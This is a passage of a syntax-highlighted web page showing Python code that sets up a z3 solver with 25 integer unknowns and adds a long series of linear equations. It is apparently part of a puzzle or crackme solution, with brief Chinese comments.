string">'f17'</span><span class="token punctuation">)</span>f18<span class="token operator">=</span>Int<span class="token punctuation">(</span><span class="token string">'f18'</span><span class="token punctuation">)</span>f19<span class="token operator">=</span>Int<span class="token punctuation">(</span><span class="token string">'f19'</span><span class="token punctuation">)</span>f20<span class="token operator">=</span>Int<span class="token punctuation">(</span><span class="token string">'f20'</span><span class="token punctuation">)</span>f21<span class="token operator">=</span>Int<span class="token punctuation">(</span><span class="token string">'f21'</span><span class="token punctuation">)</span>f22<span class="token operator">=</span>Int<span class="token punctuation">(</span><span class="token string">'f22'</span><span class="token punctuation">)</span>f23<span class="token operator">=</span>Int<span class="token punctuation">(</span><span class="token string">'f23'</span><span class="token punctuation">)</span>f24<span class="token operator">=</span>Int<span class="token punctuation">(</span><span class="token string">'f24'</span><span class="token punctuation">)</span>s <span class="token operator">=</span> Solver<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">#创建一个通用求解器</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">99</span> <span class="token operator">*</span> f0 <span class="token operator">+</span> <span class="token number">91</span> <span class="token operator">*</span> f1 <span class="token operator">+</span> <span class="token number">69</span> <span class="token operator">*</span> f2 <span class="token operator">+</span> <span class="token number">42</span> <span class="token operator">*</span> f3 <span class="token operator">+</span> <span class="token number">65</span> <span class="token operator">*</span> f4 <span class="token operator">+</span> <span class="token number">86</span> <span class="token operator">*</span> f5 <span class="token operator">+</span> <span class="token number">63</span> <span class="token operator">*</span> f6 <span class="token operator">+</span> <span class="token number">9</span> <span class="token operator">*</span> f7 <span class="token operator">+</span> <span class="token number">60</span> <span class="token operator">*</span> f8 <span class="token operator">+</span> <span class="token number">82</span> <span class="token operator">*</span> f9 <span class="token operator">+</span> <span class="token number">61</span> <span class="token operator">*</span> f10 <span class="token operator">+</span> <span class="token number">65</span> <span class="token operator">*</span> f11 <span class="token operator">+</span> <span class="token number">14</span> <span class="token operator">*</span> f12 <span class="token operator">+</span> <span class="token number">86</span> <span class="token operator">*</span> f13 <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">*</span> f14 <span class="token operator">+</span> <span class="token number">53</span> <span class="token operator">*</span> f15 <span class="token operator">+</span> <span class="token number">56</span> <span class="token operator">*</span> f16 <span class="token operator">+</span> <span class="token number">17</span> <span class="token operator">*</span> f17 <span class="token operator">+</span> <span class="token number">88</span> <span class="token operator">*</span> f18 <span class="token operator">+</span> <span class="token number">20</span> <span class="token operator">*</span> f19 <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> f20 <span class="token operator">+</span> <span class="token number">21</span> <span class="token operator">*</span> f21 <span class="token operator">+</span> <span class="token number">100</span> <span class="token operator">*</span> f22 <span class="token operator">+</span> <span class="token number">24</span> <span class="token operator">*</span> f23 <span class="token operator">+</span> <span class="token number">11</span> <span class="token operator">*</span> f24 <span class="token operator">==</span> <span class="token number">133017</span><span class="token punctuation">)</span>  <span class="token comment">#添加约束条件</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">99</span> <span class="token operator">*</span> f0 <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">*</span> f1 <span class="token operator">+</span> <span class="token number">14</span> <span class="token operator">*</span> f2 <span class="token operator">+</span> <span class="token number">30</span> <span class="token operator">*</span> f3 <span class="token operator">+</span> <span class="token number">38</span> <span class="token operator">*</span> f4 <span class="token operator">+</span> <span class="token number">23</span> <span class="token operator">*</span> f5 <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> f6 <span class="token operator">+</span> <span class="token number">100</span> <span class="token operator">*</span> f7 <span class="token operator">+</span> <span class="token number">43</span> <span class="token operator">*</span> f8 <span class="token operator">+</span> <span class="token number">58</span> <span class="token operator">*</span> f9 <span class="token operator">+</span> <span class="token number">82</span> <span class="token operator">*</span> f10 <span class="token operator">+</span> <span class="token number">20</span> <span class="token operator">*</span> f11 <span class="token operator">+</span> <span class="token number">19</span> <span class="token operator">*</span> f12 <span class="token operator">+</span> <span class="token number">39</span> <span class="token operator">*</span> f13 <span class="token operator">+</span> <span class="token number">16</span> <span class="token operator">*</span> f14 <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">*</span> f15 <span class="token operator">+</span> <span class="token number">15</span> <span class="token operator">*</span> f16 <span class="token operator">+</span> <span class="token number">82</span> <span class="token operator">*</span> f17 <span class="token operator">+</span> <span class="token number">97</span> <span class="token operator">*</span> f18 <span class="token operator">+</span> <span class="token number">47</span> <span class="token operator">*</span> f19 <span class="token operator">+</span> <span class="token number">28</span> <span class="token operator">*</span> f20 <span class="token operator">+</span> <span class="token number">51</span> <span class="token operator">*</span> f21 <span class="token operator">+</span> <span class="token number">96</span> <span class="token operator">*</span> f22 <span class="token operator">+</span> <span class="token number">54</span> <span class="token operator">*</span> f23 <span class="token operator">+</span> <span class="token number">43</span> <span class="token operator">*</span> f24 <span class="token operator">==</span> <span class="token number">113856</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">63</span> <span class="token operator">*</span> f0 <span class="token operator">+</span> <span class="token number">86</span> <span class="token operator">*</span> f1 <span class="token operator">+</span> <span class="token number">33</span> <span class="token operator">*</span> f2 <span class="token operator">+</span> <span class="token number">39</span> <span class="token operator">*</span> f3 <span class="token operator">+</span> <span class="token number">45</span> <span class="token operator">*</span> f4 <span class="token operator">+</span> <span class="token number">76</span> <span class="token operator">*</span> f5 <span class="token operator">+</span> <span class="token number">37</span> <span class="token operator">*</span> f6 <span class="token operator">+</span> <span class="token number">64</span> <span class="token operator">*</span> f7 <span class="token operator">+</span> <span class="token number">65</span> <span class="token operator">*</span> f8 <span class="token operator">+</span> <span class="token number">56</span> <span class="token operator">*</span> f9 <span class="token operator">+</span> <span class="token number">32</span> <span class="token operator">*</span> f10 <span class="token operator">+</span> <span class="token number">69</span> <span class="token operator">*</span> f11 <span class="token operator">+</span> <span class="token number">38</span> <span class="token operator">*</span> f12 <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">*</span> f13 <span class="token operator">+</span> <span class="token number">20</span> <span class="token operator">*</span> f14 <span class="token operator">+</span> <span class="token number">44</span> <span class="token operator">*</span> f15 <span class="token operator">+</span> <span class="token number">16</span> <span class="token operator">*</span> f16 <span class="token operator">+</span> <span class="token number">78</span> <span class="token operator">*</span> f17 <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">*</span> f18 <span class="token operator">+</span> <span class="token number">97</span> <span class="token operator">*</span> f19 <span class="token operator">+</span> <span class="token number">29</span> <span class="token operator">*</span> f20 <span class="token operator">+</span> <span class="token number">46</span> <span class="token operator">*</span> f21 <span class="token operator">+</span> <span class="token number">54</span> <span class="token operator">*</span> f22 <span class="token operator">+</span> <span class="token number">81</span> <span class="token operator">*</span> f23 <span class="token operator">+</span> <span class="token number">47</span> <span class="token operator">*</span> f24 <span class="token operator">==</span> <span class="token number">126193</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">9</span> <span class="token operator">*</span> f0 <span class="token operator">+</span> <span class="token number">100</span> <span class="token operator">*</span> f1 <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">*</span> f2 <span class="token operator">+</span> <span class="token number">5</span> <span class="token operator">*</span> f3 <span class="token operator">+</span> <span class="token number">99</span> <span class="token operator">*</span> f4 <span class="token operator">+</span> <span class="token number">20</span> <span class="token operator">*</span> f5 <span class="token operator">+</span> <span class="token number">37</span> <span class="token operator">*</span> f6 <span class="token operator">+</span> <span class="token number">91</span> <span class="token operator">*</span> f7 <span class="token operator">+</span> <span class="token number">53</span> <span class="token operator">*</span> f8 <span class="token operator">+</span> <span class="token number">85</span> <span class="token operator">*</span> f9 <span class="token operator">+</span> <span class="token number">52</span> <span class="token operator">*</span> f10 <span class="token operator">+</span> <span class="token number">49</span> <span class="token operator">*</span> f11 <span class="token operator">+</span> <span class="token number">69</span> <span class="token operator">*</span> f12 <span class="token operator">+</span> <span class="token number">32</span> <span class="token operator">*</span> f13 <span class="token operator">+</span> <span class="token number">7</span> <span class="token operator">*</span> f14 <span class="token operator">+</span> <span class="token number">81</span> <span class="token operator">*</span> f15 <span class="token operator">+</span> <span class="token number">80</span> <span class="token operator">*</span> f16 <span class="token operator">+</span> <span class="token number">89</span> <span class="token operator">*</span> f17 <span class="token operator">+</span> <span class="token number">87</span> <span class="token operator">*</span> f18 <span class="token operator">+</span> <span class="token number">24</span> <span class="token operator">*</span> f19 <span class="token operator">+</span> <span class="token number">90</span> <span class="token operator">*</span> f20 <span class="token operator">+</span> <span class="token number">54</span> <span class="token operator">*</span> f21 <span class="token operator">+</span> <span class="token number">16</span> <span class="token operator">*</span> f22 <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> f23 <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">*</span> f24 <span class="token operator">==</span> <span class="token number">128397</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>  <span class="token number">72</span> <span class="token operator">*</span> f0 <span class="token operator">+</span> <span class="token number">18</span> <span class="token operator">*</span> f1 <span class="token operator">+</span> <span class="token number">71</span> <span class="token operator">*</span> f2 <span class="token operator">+</span> <span class="token number">28</span> <span class="token operator">*</span> f3 <span class="token operator">+</span> <span class="token number">67</span> <span class="token operator">*</span> f4 <span class="token operator">+</span> <span class="token number">25</span> <span class="token operator">*</span> f5 <span class="token operator">+</span> <span class="token number">26</span> <span class="token operator">*</span> f6 <span class="token operator">+</span> <span class="token number">59</span> <span class="token operator">*</span> f7 <span class="token operator">+</span> <span class="token number">96</span> <span class="token operator">*</span> f8 <span class="token operator">+</span> <span class="token number">30</span> <span class="token operator">*</span> f9 <span class="token operator">+</span> <span class="token number">65</span> <span class="token operator">*</span> f10 <span class="token operator">+</span> <span class="token number">39</span> <span class="token operator">*</span> f11 <span class="token operator">+</span> <span class="token number">29</span> <span class="token operator">*</span> f12 <span class="token operator">+</span> <span class="token number">35</span> <span class="token operator">*</span> f13 <span class="token operator">+</span> <span class="token number">95</span> <span class="token operator">*</span> f14 <span class="token operator">+</span> <span class="token number">55</span> <span class="token operator">*</span> f15 <span class="token operator">+</span> <span class="token number">67</span> <span class="token operator">*</span> f16 <span class="token operator">+</span> <span class="token number">63</span> <span class="token operator">*</span> f17 <span class="token operator">+</span> <span class="token number">72</span> <span class="token operator">*</span> f18 <span class="token operator">+</span> <span class="token number">61</span> <span class="token operator">*</span> f19 <span class="token operator">+</span> <span class="token number">30</span> <span class="token operator">*</span> f20 <span class="token operator">+</span> <span class="token number">74</span> <span class="token operator">*</span> f21 <span class="token operator">+</span> <span class="token number">38</span> <span class="token operator">*</span> f22 <span class="token operator">+</span> <span class="token number">61</span> <span class="token operator">*</span> f23 <span class="token operator">+</span> <span class="token number">58</span> <span class="token operator">*</span> f24 <span class="token operator">==</span> <span class="token number">138932</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">30</span> <span class="token operator">*</span> f0 <span class="token operator">+</span> <span class="token number">69</span> <span class="token operator">*</span> f1 <span class="token operator">+</span> <span class="token number">52</span> <span class="token operator">*</span> f2 <span class="token operator">+</span> <span class="token number">68</span> <span class="token operator">*</span> f3 <span class="token operator">+</span> <span class="token number">94</span> <span class="token operator">*</span> f4 <span class="token operator">+</span> <span class="token number">37</span> <span class="token operator">*</span> f5 <span class="token operator">+</span> <span class="token number">13</span> <span class="token operator">*</span> f6 <span class="token operator">+</span> <span class="token number">85</span> <span class="token operator">*</span> f7 <span class="token operator">+</span> <span class="token number">97</span> <span class="token operator">*</span> f8 <span class="token operator">+</span> <span class="token number">66</span> <span class="token operator">*</span> f9 <span class="token operator">+</span> <span class="token number">57</span> <span class="token operator">*</span> f10 <span class="token operator">+</span> <span class="token number">40</span> <span class="token operator">*</span> f11 <span class="token operator">+</span> <span class="token number">11</span> <span class="token operator">*</span> f12 <span class="token operator">+</span> <span class="token number">93</span> <span class="token operator">*</span> f13 <span class="token operator">+</span> <span class="token number">87</span> <span class="token operator">*</span> f14 <span class="token operator">+</span> <span class="token number">22</span> <span class="token operator">*</span> f15 <span class="token operator">+</span> <span class="token number">61</span> <span class="token operator">*</span> f16 <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">*</span> f17 <span class="token operator">+</span> <span class="token number">17</span> <span class="token operator">*</span> f18 <span class="token operator">+</span> <span class="token number">54</span> <span class="token operator">*</span> f19 <span class="token operator">+</span> <span class="token number">22</span> <span class="token operator">*</span> f20 <span class="token operator">+</span> <span class="token number">18</span> <span class="token operator">*</span> f21 <span class="token operator">+</span> <span class="token number">57</span> <span class="token operator">*</span> f22 <span class="token operator">+</span> <span class="token number">58</span> <span class="token operator">*</span> f23 <span class="token operator">+</span> <span class="token number">88</span> <span class="token operator">*</span> f24 <span class="token operator">==</span> <span class="token number">136211</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">81</span> <span class="token operator">*</span> f0 <span class="token operator">+</span> <span class="token number">62</span> <span class="token operator">*</span> f1 <span class="token operator">+</span> <span class="token number">83</span> <span class="token operator">*</span> f2 <span class="token operator">+</span> <span class="token number">60</span> <span class="token operator">*</span> f3 <span class="token operator">+</span> <span class="token number">71</span> <span class="token operator">*</span> f4 <span class="token operator">+</span> <span class="token number">64</span> <span class="token operator">*</span> f5 <span class="token operator">+</span> <span class="token number">96</span> <span class="token operator">*</span> f6 <span class="token operator">+</span> <span class="token number">88</span> <span class="token operator">*</span> f7 <span class="token operator">+</span> <span class="token number">96</span> <span class="token operator">*</span> f8 <span class="token operator">+</span> <span class="token number">39</span> <span class="token operator">*</span> f9 <span class="token operator">+</span> <span class="token number">23</span> <span class="token operator">*</span> f10 <span class="token operator">+</span> <span class="token number">77</span> <span class="token operator">*</span> f11 <span class="token operator">+</span> <span class="token number">85</span> <span class="token operator">*</span> f12 <span class="token operator">+</span> <span class="token number">87</span> <span class="token operator">*</span> f13 <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">*</span> f14 <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">*</span> f15 <span class="token operator">+</span> <span class="token number">56</span> <span class="token operator">*</span> f16 <span class="token operator">+</span> <span class="token number">67</span> <span class="token operator">*</span> f17 <span class="token operator">+</span> <span class="token number">59</span> <span class="token operator">*</span> f18 <span class="token operator">+</span> <span class="token number">11</span> <span class="token operator">*</span> f19 <span class="token operator">+</span> <span class="token number">32</span> <span class="token operator">*</span> f20 <span class="token operator">+</span> <span class="token number">41</span> <span class="token operator">*</span> f21 <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">*</span> f22 <span class="token operator">+</span> <span class="token number">71</span> <span class="token operator">*</span> f23 <span class="token operator">+</span> <span class="token number">10</span> <span class="token operator">*</span> f24 <span class="token operator">==</span> <span class="token number">141572</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">95</span> <span class="token operator">*</span> f0 <span class="token operator">+</span> <span class="token number">66</span> <span class="token operator">*</span> f1 <span class="token operator">+</span> <span class="token number">37</span> <span class="token operator">*</span> f2 <span class="token operator">+</span> <span class="token number">55</span> <span class="token operator">*</span> f3 <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">*</span> f4 <span class="token operator">+</span> <span class="token number">29</span> <span class="token operator">*</span> f5 <span class="token operator">+</span> <span class="token number">65</span> <span class="token operator">*</span> f6 <span class="token operator">+</span> <span class="token number">85</span> <span class="token operator">*</span> f7 <span class="token operator">+</span> <span class="token number">68</span> <span class="token operator">*</span> f8 <span class="token operator">+</span> <span class="token number">95</span> <span class="token operator">*</span> f9 <span class="token operator">+</span> <span class="token number">77</span> <span class="token operator">*</span> f10 <span class="token operator">+</span> <span class="token number">16</span> <span class="token operator">*</span> f11 <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">*</span> f12 <span class="token operator">+</span> <span class="token number">94</span> <span class="token operator">*</span> f13 <span class="token operator">+</span> <span class="token number">54</span> <span class="token operator">*</span> f14 <span class="token operator">+</span> <span class="token number">92</span> <span class="token operator">*</span> f15 <span class="token operator">+</span> <span class="token number">44</span> <span class="token operator">*</span> f16 <span class="token operator">+</span> <span class="token number">48</span> <span class="token operator">*</span> f17 <span class="token operator">+</span> <span class="token number">70</span> <span class="token operator">*</span> f18 <span class="token operator">+</span> <span class="token number">25</span> <span class="token operator">*</span> f19 <span class="token operator">+</span> <span class="token number">57</span> <span class="token operator">*</span> f20 <span class="token operator">+</span> <span class="token number">48</span> <span class="token operator">*</span> f21 <span class="token operator">+</span> <span class="token number">74</span> <span class="token operator">*</span> f22 <span class="token operator">+</span> <span class="token number">63</span> <span class="token operator">*</span> f23 <span class="token operator">+</span> <span class="token number">49</span> <span class="token operator">*</span> f24 <span class="token operator">==</span> <span class="token number">143300</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">79</span> <span class="token operator">*</span> f0 <span class="token operator">+</span> <span class="token number">85</span> <span class="token operator">*</span> f1 <span class="token operator">+</span> <span class="token number">53</span> <span class="token operator">*</span> f2 <span class="token operator">+</span> <span class="token number">93</span> <span class="token operator">*</span> f3 <span class="token operator">+</span> <span class="token number">69</span> <span class="token operator">*</span> f4 <span class="token operator">+</span> <span class="token number">33</span> <span class="token operator">*</span> f5 <span class="token operator">+</span> <span class="token number">63</span> <span class="token operator">*</span> f6 <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">*</span> f7 <span class="token operator">+</span> <span class="token number">93</span> <span class="token operator">*</span> f8 <span class="token operator">+</span> <span class="token number">82</span> <span class="token operator">*</span> f9 <span class="token operator">+</span> <span class="token number">73</span> <span class="token operator">*</span> f10 <span class="token operator">+</span> <span class="token number">37</span> <span class="token operator">*</span> f11 <span class="token operator">+</span> <span class="token number">91</span> <span class="token operator">*</span> f12 <span class="token operator">+</span> <span class="token number">13</span> <span class="token operator">*</span> f13 <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">*</span> f14 <span class="token operator">+</span> <span class="token number">62</span> <span class="token operator">*</span> f15 <span class="token operator">+</span> <span class="token number">60</span> <span class="token operator">*</span> f16 <span class="token operator">+</span> <span class="token number">17</span> <span class="token operator">*</span> f17 <span class="token operator">+</span> <span class="token number">7</span> <span class="token operator">*</span> f18 <span class="token operator">+</span> <span class="token number">95</span> <span class="token operator">*</span> f19 <span class="token operator">+</span> <span class="token number">65</span> <span class="token operator">*</span> f20 <span class="token operator">+</span> <span class="token number">91</span> <span class="token operator">*</span> f21 <span class="token operator">+</span> <span class="token number">14</span> <span class="token operator">*</span> f22 <span class="token operator">+</span> <span class="token number">64</span> <span class="token operator">*</span> f23 <span class="token operator">+</span> <span class="token number">66</span> <span class="token operator">*</span> f24 <span class="token operator">==</span> <span class="token number">146502</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>   <span class="token number">33</span> <span class="token operator">*</span> f0 <span class="token operator">+</span> <span class="token number">57</span> <span class="token operator">*</span> f1 <span class="token operator">+</span> <span class="token number">13</span> <span class="token operator">*</span> f2 <span class="token operator">+</span> <span class="token number">85</span> <span class="token operator">*</span> f3 <span class="token operator">+</span> <span class="token number">83</span> <span class="token operator">*</span> f4 <span class="token operator">+</span> <span class="token number">31</span> <span class="token operator">*</span> f5 <span class="token operator">+</span> <span class="token number">73</span> <span class="token operator">*</span> f6 <span class="token operator">+</span> <span class="token number">41</span> <span class="token operator">*</span> f7 <span class="token operator">+</span> <span class="token number">19</span> <span class="token operator">*</span> f8 <span class="token operator">+</span> <span class="token number">41</span> <span class="token operator">*</span> f9 <span class="token operator">+</span> <span class="token number">80</span> <span class="token operator">*</span> f10 <span class="token operator">+</span> <span class="token number">33</span> <span class="token operator">*</span> f11 <span class="token operator">+</span> <span class="token number">5</span> <span class="token operator">*</span> f12 <span class="token operator">+</span> <span class="token number">42</span> <span class="token operator">*</span> f13 <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">*</span> f14 <span class="token operator">+</span> <span class="token number">27</span> <span class="token operator">*</span> f15 <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">*</span> f16 <span class="token operator">+</span> <span class="token number">55</span> <span class="token operator">*</span> f17 <span class="token operator">+</span> <span class="token number">24</span> <span class="token operator">*</span> f18 <span class="token operator">+</span> <span class="token number">72</span> <span class="token operator">*</span> f19 <span class="token operator">+</span> <span class="token number">21</span> <span class="token operator">*</span> f20 <span class="token operator">+</span> <span class="token number">98</span> <span class="token operator">*</span> f21 <span class="token operator">+</span> <span class="token number">89</span> <span class="token operator">*</span> f22 <span class="token operator">+</span> <span class="token number">58</span> <span class="token operator">*</span> f23 <span class="token operator">+</span> <span class="token number">41</span> <span class="token operator">*</span> f24 <span class="token operator">==</span> <span class="token number">118533</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>   <span class="token number">29</span> <span class="token operator">*</span> f0 <span class="token operator">+</span> <span class="token number">5</span> <span class="token operator">*</span> f1 <span class="token operator">+</span> <span class="token number">52</span> <span class="token operator">*</span> f2 <span class="token operator">+</span> <span class="token number">22</span> <span class="token operator">*</span> f3 <span class="token operator">+</span> <span class="token number">21</span> <span class="token operator">*</span> f4 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> f5 <span class="token operator">+</span> <span class="token number">41</span> <span class="token operator">*</span> f6 <span class="token operator">+</span> <span class="token number">10</span> <span class="token operator">*</span> f7 <span class="token operator">+</span> <span class="token number">51</span> <span class="token operator">*</span> f8 <span class="token operator">+</span> <span class="token number">69</span> <span class="token operator">*</span> f9 <span class="token operator">+</span> <span class="token number">90</span> <span class="token operator">*</span> f10 <span class="token operator">+</span> <span class="token number">63</span> <span class="token operator">*</span> f11 <span class="token operator">+</span> <span class="token number">90</span> <span class="token operator">*</span> f12 <span class="token operator">+</span> <span class="token number">24</span> <span class="token operator">*</span> f13 <span class="token operator">+</span> <span class="token number">91</span> <span class="token operator">*</span> f14 <span class="token operator">+</span> <span class="token number">99</span> <span class="token operator">*</span> f15 <span class="token operator">+</span> <span class="token number">40</span> <span class="token operator">*</span> f16 <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> f17 <span class="token operator">+</span> <span class="token number">17</span> <span class="token operator">*</span> f18 <span class="token operator">+</span> <span class="token number">81</span> <span class="token operator">*</span> f19 <span class="token operator">+</span> <span class="token number">47</span> <span class="token operator">*</span> f20 <span class="token operator">+</span> <span class="token number">100</span> <span class="token operator">*</span> f21 <span class="token operator">+</span> <span class="token number">99</span> <span class="token operator">*</span> f22 <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">*</span> f23 <span class="token operator">+</span> <span class="token number">46</span> <span class="token operator">*</span> f24 <span class="token operator">==</span> <span class="token number">124392</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>  <span class="token number">59</span> <span class="token operator">*</span> f0 <span class="token operator">+</span> <span class="token number">64</span> <span class="token operator">*</span> f1 <span class="token operator">+</span> <span class="token number">99</span> <span class="token operator">*</span> f2 <span class="token operator">+</span> <span class="token number">26</span> <span class="token operator">*</span> f3 <span class="token operator">+</span> <span class="token number">76</span> <span class="token operator">*</span> f4 <span class="token operator">+</span> <span class="token number">42</span> <span class="token operator">*</span> f5 <span class="token operator">+</span> <span class="token number">37</span> <span class="token operator">*</span> f6 <span class="token operator">+</span> <span class="token number">62</span> <span class="token operator">*</span> f7 <span class="token operator">+</span> <span class="token number">14</span> <span class="token operator">*</span> f8 <span class="token operator">+</span> <span class="token number">15</span> <span class="token operator">*</span> f9 <span class="token operator">+</span> <span class="token number">15</span> <span class="token operator">*</span> f10 <span class="token operator">+</span> <span class="token number">49</span> <span class="token operator">*</span> f11 <span class="token operator">+</span> <span class="token number">10</span> <span class="token operator">*</span> f12 <span class="token operator">+</span> <span class="token number">88</span> <span class="token operator">*</span> f13 <span class="token operator">+</span> <span class="token number">5</span> <span class="token operator">*</span> f14 <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">*</span> f15 <span class="token operator">+</span> <span class="token number">52</span> <span class="token operator">*</span> f16 <span class="token operator">+</span> <span class="token number">70</span> <span class="token operator">*</span> f17 <span class="token operator">+</span> <span class="token number">89</span> <span class="token operator">*</span> f18 <span class="token operator">+</span> <span class="token number">37</span> <span class="token operator">*</span> f19 <span class="token operator">+</span> <span class="token number">98</span> <span class="token operator">*</span> f20 <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">*</span> f21 <span class="token operator">+</span> <span class="token number">18</span> <span class="token operator">*</span> f22 <span class="token operator">+</span> <span class="token number">75</span> <span class="token operator">*</span> f23 <span class="token operator">+</span> <span class="token number">13</span> <span class="token operator">*</span> f24 <span class="token operator">==</span> <span class="token number">118223</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">66</span> <span class="token operator">*</span> f0 <span class="token operator">+</span> <span class="token number">65</span> <span class="token operator">*</span> f1 <span class="token operator">+</span> <span class="token number">5</span> <span class="token operator">*</span> f2 <span class="token operator">+</span> <span class="token number">80</span> <span class="token operator">*</span> f3 <span class="token operator">+</span> <span class="token number">42</span> <span class="token operator">*</span> f4 <span class="token operator">+</span> <span class="token number">93</span> <span class="token operator">*</span> f5 <span class="token operator">+</span> <span class="token number">42</span> <span class="token operator">*</span> f6 <span class="token operator">+</span> <span class="token number">15</span> <span class="token operator">*</span> f7 <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">*</span> f8 <span class="token operator">+</span> <span class="token number">90</span> <span class="token operator">*</span> f9 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> f10 <span class="token operator">+</span> <span class="token number">14</span> <span class="token operator">*</span> f11 <span class="token operator">+</span> <span class="token number">97</span> <span class="token operator">*</span> f12 <span class="token operator">+</span> <span class="token number">25</span> <span class="token operator">*</span> f13 <span class="token operator">+</span> <span class="token number">68</span> <span class="token operator">*</span> f14 <span class="token operator">+</span> <span class="token number">93</span> <span class="token operator">*</span> f15 <span class="token operator">+</span> <span class="token number">78</span> <span class="token operator">*</span> f16 <span class="token operator">+</span> <span class="token number">33</span> <span class="token operator">*</span> f17 <span class="token operator">+</span> <span class="token number">33</span> <span class="token operator">*</span> f18 <span class="token operator">+</span> <span class="token number">70</span> <span class="token operator">*</span> f19 <span class="token operator">+</span> <span class="token number">21</span> <span class="token operator">*</span> f20 <span class="token operator">+</span> <span class="token number">10</span> <span class="token operator">*</span> f21 <span class="token operator">+</span> <span class="token number">25</span> <span class="token operator">*</span> f22 <span class="token operator">+</span> <span class="token number">92</span> <span class="token operator">*</span> f23 <span class="token operator">+</span> <span class="token number">43</span> <span class="token operator">*</span> f24 <span class="token operator">==</span> <span class="token number">122643</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">25</span> <span class="token operator">*</span> f0 <span class="token operator">+</span> <span class="token number">95</span> <span class="token operator">*</span> f1 <span class="token operator">+</span> <span class="token number">15</span> <span class="token operator">*</span> f2 <span class="token operator">+</span> <span class="token number">82</span> <span class="token operator">*</span> f3 <span class="token operator">+</span> <span class="token number">82</span> <span class="token operator">*</span> f4 <span class="token operator">+</span> <span class="token number">99</span> <span class="token operator">*</span> f5 <span class="token operator">+</span> <span class="token number">9</span> <span class="token operator">*</span> f6 <span class="token operator">+</span> <span class="token number">60</span> <span class="token operator">*</span> f7 <span class="token operator">+</span> <span class="token number">74</span> <span class="token operator">*</span> f8 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> f9 <span class="token operator">+</span> <span class="token number">82</span> <span class="token operator">*</span> f10 <span class="token operator">+</span> <span class="token number">99</span> <span class="token operator">*</span> f11 <span class="token operator">+</span> <span class="token number">79</span> <span class="token operator">*</span> f12 <span class="token operator">+</span> <span class="token number">83</span> <span class="token operator">*</span> f13 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> f14 <span class="token operator">+</span> <span class="token number">42</span> <span class="token operator">*</span> f15 <span class="token operator">+</span> <span class="token number">41</span> <span class="token operator">*</span> f16 <span class="token operator">+</span> <span class="token number">75</span> <span class="token operator">*</span> f17 <span class="token operator">+</span> <span class="token number">93</span> <span class="token operator">*</span> f18 <span class="token operator">+</span> <span class="token number">75</span> <span class="token operator">*</span> f19 <span class="token operator">+</span> <span class="token number">36</span> <span class="token operator">*</span> f20 <span class="token operator">+</span> <span class="token number">57</span> <span class="token operator">*</span> f21 <span class="token operator">+</span> <span class="token number">84</span> <span class="token operator">*</span> f22 <span class="token operator">+</span> <span class="token number">99</span> <span class="token operator">*</span> f23 <span class="token operator">+</span> <span class="token number">67</span> <span class="token operator">*</span> f24 <span class="token operator">==</span> <span class="token number">166882</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">26</span> <span class="token operator">*</span> f0 <span class="token operator">+</span> <span class="token number">14</span> <span class="token operator">*</span> f1 <span class="token operator">+</span> <span class="token number">83</span> <span class="token operator">*</span> f2 <span class="token operator">+</span> <span class="token number">22</span> <span class="token operator">*</span> f3 <span class="token operator">+</span> <span class="token number">62</span> <span class="token operator">*</span> f4 <span class="token operator">+</span> <span class="token number">50</span> <span class="token operator">*</span> f5 <span class="token operator">+</span> <span class="token number">68</span> <span class="token operator">*</span> f6 <span class="token operator">+</span> <span class="token number">95</span> <span class="token operator">*</span> f7 <span class="token operator">+</span> <span class="token number">27</span> <span class="token operator">*</span> f8 <span class="token operator">+</span> <span class="token number">99</span> <span class="token operator">*</span> f9 <span class="token operator">+</span> <span class="token number">29</span> <span class="token 